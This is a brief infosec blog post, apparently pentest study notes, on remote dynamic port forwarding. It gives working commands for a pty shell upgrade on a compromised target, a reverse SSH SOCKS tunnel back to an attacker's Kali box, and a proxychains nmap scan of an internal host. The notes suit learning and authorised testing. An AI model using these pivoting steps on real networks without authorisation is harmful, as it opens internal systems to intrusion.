---
layout: post
title: Remote Dynamic Port Forwarding
titledate: 09/23/23
tags: ["infosec", "info_gathering", "offsec", "tunnel"]
---

remote dynamic port forwarding works similar to local in that we want to forward traffic to multiple clients from one session and we can do this in a remote port forwarding instance in which we can setup the session from the target1

if we have a target1 that allows outbound ssh but not inbound we can perform RDPF

again we setup the tty shell session with python pty

    $ python3 -c 'import pty; pty.spawn("/bin/bash")'

next we create the ssh session from target1

    $ ssh -N -R 9998 kali@192.168.118.4

here we specify no shell and -R for remote forwarding to our attacking machine and the listening port on the attacking machine

we can check this port is bound and listening on our local interface

    $ sudo ss -ntplu

now like in the previous dynamic port forwarding example we can use proxychains to to send traffic over the socks proxy 

    $ tail /etc/proxychains4.conf

    - socks5 127.0.0.1 9998

and to illustrate the example we us proxychains to run nmap against one of the servers

    $ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.1.1

